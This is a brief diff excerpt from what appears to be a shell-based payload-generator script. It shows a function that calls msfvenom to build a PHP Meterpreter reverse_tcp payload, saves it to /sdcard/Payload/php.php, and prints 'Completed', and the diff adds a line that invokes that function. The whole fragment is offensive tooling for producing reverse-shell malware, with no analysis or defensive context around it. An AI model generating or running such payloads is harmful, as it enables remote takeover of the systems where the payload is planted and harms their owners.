@@ -7,3 +7,4 @@ p() {
 	msfvenom -p php/meterpreter/reverse_tcp R > /sdcard/Payload/php.php
 	printf "\n Completed\n\n"
 	}
+	p
